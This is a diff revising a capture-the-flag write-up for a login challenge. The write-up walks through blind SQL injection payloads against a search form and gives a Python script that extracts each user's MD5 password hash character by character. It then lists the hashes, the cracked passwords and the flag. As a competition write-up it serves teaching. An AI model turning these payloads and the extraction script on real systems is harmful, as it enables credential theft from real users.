@@ -42,42 +42,45 @@ After playing around with injections for a little while, we find a nested SELECT
 Through trial and error, we find that there are three basic ways in which the server can respond to our queries: with data, with no data, or with an error. Each of these happens in a different situation and gives us more insight into the structure of the database.
 
 First, since we already know `USERNAME` exists, we use this as a baseline for a known-good query. We see that we get user data back when a specific column exists.
-` %" AND username in (SELECT username FROM sqlite_master where username like "%") -- - `
+`%" AND username in (SELECT username FROM sqlite_master where username like "%") --`
 
-Next we try an obviously non-existent column to establish a baseline response for the negative.  When this is the case, we get the message `ERROR: Something went wrong!`
-`%" AND username in (SELECT username FROM sqlite_master where FAKE like "%") -- -`
+Next, we try to query columns for users we know don't exist.  This simply returns no information at all, without giving us any errors.
+`%" AND username in (SELECT username FROM sqlite_master where username like "FAKE") --`
 
-Using this knowledge we can guess at what the password column must be called, and after a couple tried we find that "password_hash" doesn't throw us any errors.  Now that we know what we're up against, we can switch up our query and use our old wildcard friend to brute-force the key using a query like:
-`bob" AND username in (SELECT username FROM sqlite_master where password_hash like "4%") -- -`
+Lastly, we try a non-existent column to establish a baseline response for faulty queries.  When this is the case, we get the message `ERROR: Something went wrong!` We also get this error when we forget to comment out otherwise good, working queries by ending the query with the SQL single-line comment symbol `--`
+`%" AND username in (SELECT username FROM sqlite_master where FAKE like "%") --`
 
-This is Python script that will be responsible for doing all of the heavy lifting:
+Using this knowledge we can guess at what the password column must be called, and after a couple tries we find that "password_hash" doesn't throw us any errors.  Now that we know what we're up against, we can switch up our query and use our old wildcard friend to brute-force the hash 1 character at a time by using a query like:
+`%" AND username in (SELECT username FROM sqlite_master where password_hash like "%") --`
+
+Below is Python script that will be responsible for doing all of the heavy lifting. If what we know of the hash so far is correct for that user, the user's information is returned (e.g if Bob's hash starts with `41%`.) If any character of the hash so far is wrong (e.g if we ask if Bob's hash starts with `4F%`) the application won't return us any info at all. This allows us to check for the existence of the `bio` string for each user to make sure we're always on the right track.
 
 {% highlight python %}
 import requests
-chars = '1234567890abcdef'                    # list of hex characters
-names = ['alice','bob','carl','dania','noob'] # list of usernames
+chars = '1234567890abcdef'                    
+names = ['alice','bob','carl','dania','noob'] 
 
-def hashfinder(x, name):                      # we create a function for the repetitive task of brute-forcing
+def hashfinder(x, name):                      
     url = 'https://login.chal.uiuc.tf/search'
     query = {'request' : name+'" AND username in (SELECT username FROM sqlite_master where password_hash like "'+x+'%") -- -'}
-    req = requests.post(url, data=query)      # send request with our injection payload
-    if 'is '+name in req.text:                # we check for the correct bio (since username also appears in the textbox)
-        return(x)                             # and return the character if it's correct
+    req = requests.post(url, data=query)      
+    if 'is '+name in req.text:                
+        return(x)                             
 
-for name in names:                            # for every username
-    pwhash=''                                 # we clear the hash and start again
-    while len(pwhash) < 32:                   # then, while it's not a full md5 hash
-        for y in chars:                       # try to add a character
-            if hashfinder(pwhash+y, name):    # to what we already know
-                pwhash+=y                     # if it works, we start on the next one
-                if len(pwhash) == 32:         # and if we have a full hash
-                    print(name +':'+ pwhash)  # we print it with the username
+for name in names:                            
+    pwhash=''                                 
+    while len(pwhash) < 32:                   
+        for y in chars:                       
+            if hashfinder(pwhash+y, name):    
+                pwhash+=y                     
+                if len(pwhash) == 32:         
+                    print(name +':'+ pwhash)  
 {% endhighlight %}
 
-Which gives us the output of:
+When run, this bad boy gives us the output of:
 
 | name | hash |
-|------|------|
+|:----:|:----:|
 | alice | 530bd2d24bff2d77276c4117dc1fc719 |
 | bob | 4106716ae604fba94f1c05318f87e063 |
 | carl | 661ded81b6b99758643f19517a468331 |
@@ -97,44 +100,15 @@ The fifth and final hash is the most interesting one of the bunch.  The password
 
 On this [UTF-8 encoding table,](https://utf8-chartable.de/unicode-utf8-table.pl?start=1536) Arabic letters span 256 characters from `D880` to `DBBF`. We split up these two bytes and create a mask for each, meaning that each single Arabic letter is represented in the mask by a `?1?2` pair. Once we get the rule written, the hash is cracked rather quickly. With the final hash cracked, all we have to do is put together the five pieces of the flag and claim out 200 points!
 
+Here's what all the data looks like when we're all done:
 
 | name | hint | hash | password | flag |
 |------|------|------|----------|------|
 | noob | `(none)` | 8553127fedf5daacc26f3b677b58a856 | SoccerMom2007 | `Here's part 0 of the flag: uiuctf{Dump` |
-| alice | `My phone number (format: 000-000-0000)` | 530bd2d24bff2d77276c4117dc1fc719 | 704-186-9744 | `Here's part 1 of the flag: _4nd_un` |
-| bob | `My favorite 12 digit number (md5 hashed for extra security) [starts with a 10]` | 4106716ae604fba94f1c05318f87e063 | 5809be03c7cc31cdb12237d0bd718898 | `Here's part 2 of the flag: h45h_63` |
-| carl | `My favorite Greek God + My least favorite US state (no spaces)` | 661ded81b6b99758643f19517a468331 | DionysusDelaware | `Here's part 3 of the flag: 7_d4t_` |
-| dania | `الحيوان المفضل لدي (6 أحرف عربية فقط)` | 58970d579d25f7288599fcd709b3ded3 | طاووسة | `Here's part 4 of the flag: c45h` |
-
--name: Noob
--hint: (none)
--hash: 8553127fedf5daacc26f3b677b58a856
--pass: SoccerMom2007
--flag: You have successfully logged in! Here's part 0 of the flag: uiuctf{Dump
-
--name: Alice
--hint: My phone number (format: 000-000-0000) 
--hash: 530bd2d24bff2d77276c4117dc1fc719
--pass: 704-186-9744
--flag: You have successfully logged in! Here's part 1 of the flag: _4nd_un
-
--name: Bob
--hint: My favorite 12 digit number (md5 hashed for extra security) [starts with a 10] 	
--hash: 4106716ae604fba94f1c05318f87e063
--pass: 5809be03c7cc31cdb12237d0bd718898 (md5 of 102420484096)
--flag: You have successfully logged in! Here's part 2 of the flag: h45h_63
-
--name: Carl
--hint: My favorite Greek God + My least favorite US state (no spaces)
--hash: 661ded81b6b99758643f19517a468331
--pass: DionysusDelaware
--flag: You have successfully logged in! Here's part 3 of the flag: 7_d4t_
-
--name: Dania
--hint: الحيوان المفضل لدي (6 أحرف عربية فقط)  (Translated : `My favorite animal (6 Arabic characters only)`)
--hash: 58970d579d25f7288599fcd709b3ded3
--pass: طاووسة
--flag: You have successfully logged in! Here's part 4 of the flag: c45h}
+| alice | `My phone number (format: 000-000-0000)` | 530bd2d24bff2d77276c4117dc1fc719 | 704-186-9744 | ` _4nd_un` |
+| bob | `My favorite 12 digit number (md5 hashed for extra security) [starts with a 10]` | 4106716ae604fba94f1c05318f87e063 | 5809be03c7cc31cdb12237d0bd718898 | `h45h_63` |
+| carl | `My favorite Greek God + My least favorite US state (no spaces)` | 661ded81b6b99758643f19517a468331 | DionysusDelaware | `7_d4t_` |
+| dania | `الحيوان المفضل لدي (6 أحرف عربية فقط)` | 58970d579d25f7288599fcd709b3ded3 | طاووسة | `c45h}` |
 
 
 ----------------
